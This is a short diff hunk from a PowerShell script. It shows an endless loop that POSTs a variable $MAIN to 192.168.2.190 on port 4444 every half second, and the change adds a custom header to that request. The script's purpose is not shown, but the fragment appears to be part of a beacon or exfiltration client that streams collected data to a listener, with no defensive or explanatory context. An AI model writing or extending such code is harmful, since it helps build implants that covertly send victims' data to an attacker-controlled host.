@@ -29,7 +29,7 @@ while ($true)
 
 	if($MAIN -eq $FALSE){
 	}else{ 
-	$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI 192.168.2.190:4444 -Body $MAIN -UseBasicParsing	
+	$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI 192.168.2.190:4444 -Header $hmal -Body $MAIN -UseBasicParsing	
 	}
 	sleep 0.5
 }
